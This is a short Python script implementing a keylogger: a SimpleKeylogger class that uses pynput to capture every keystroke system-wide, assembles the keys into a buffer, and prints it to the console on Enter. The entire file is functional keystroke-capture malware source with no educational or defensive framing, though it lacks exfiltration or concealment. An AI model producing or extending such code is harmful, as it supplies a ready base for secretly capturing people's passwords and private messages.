import pynput.keyboard

class SimpleKeylogger:
	def __init__(self):
		self.logger = ""
	
	def append_to_log(self,key_strike):
		
		self.logger = self.logger + key_strike
		self.logger = self.logger
	

	def evaluate_keys(self, key):
		try:
			Pressed_key = str(key.char)
		except AttributeError:
			Pressed_key = ""

			if key == key.enter:
				print(self.logger)
				self.logger = ""
			elif key == key.backspace:
				self.logger = self.logger[0:len(self.logger)-1]
			elif key == key.space:
				Pressed_key = ""
				self.logger = self.logger  + " "
			elif key == key.shift:
				test = 'pass'
			else:
				Pressed_key = "[" + str(key) + "] "
			
		self.append_to_log(Pressed_key)

	def run(self):
		keyboard_listener = pynput.keyboard.Listener(on_press = self.evaluate_keys)
		with keyboard_listener:
			self.logger = ""
			keyboard_listener.join()
		


SimpleKeylogger().run()
